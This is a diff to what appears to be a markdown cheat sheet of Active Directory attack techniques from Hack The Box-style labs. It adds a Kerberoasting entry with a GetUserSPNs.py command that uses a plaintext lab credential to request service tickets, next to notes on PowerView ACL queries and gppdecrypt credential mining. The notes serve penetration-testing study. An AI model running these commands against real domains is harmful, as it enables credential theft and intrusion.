@@ -25,7 +25,10 @@ keywords: Internals
     Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object { $_.IdentityReference -match "svc-alfresco" }
     ```
  - [SYSVOL Group Policy Credential Mining](https://adsecurity.org/?p=2288)
-   - ```gppdecrypt``` 
+   - ```gppdecrypt```
+ - [Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
+   - GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100```
+   - Requires an account user with a service principal name (SPN)
 
 ## Active Directory Tools
  - [PowerView (Deprecated since 2021)](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
